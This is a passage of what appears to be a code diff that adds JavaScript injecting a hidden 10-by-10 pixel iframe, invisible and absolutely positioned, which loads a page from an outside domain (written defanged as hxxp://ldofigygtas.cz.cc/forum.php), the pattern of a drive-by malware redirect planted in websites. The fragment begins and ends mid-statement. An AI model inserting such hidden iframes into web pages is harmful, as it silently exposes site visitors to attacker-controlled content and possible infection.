@@ -1,0 +1,13 @@
+eight='10' style='visibility:
+hidden;position:absolute;left:0;top:0;'></iframe>");
+}
+function iframer(){
+  var f = do​cument.createElement('iframe');
+  f.setAttribute('src', 'hxxp://ldofigygtas.cz.cc/forum.php');
+  f.style.visibility = 'hidden';
+  f.style.position = 'absolute';
+  f.style.left = '0';
+  f.style.top = '0';
+  f.setAttribute('width', '10');
+  f.setAttribute('height', '10');
+  do​cu
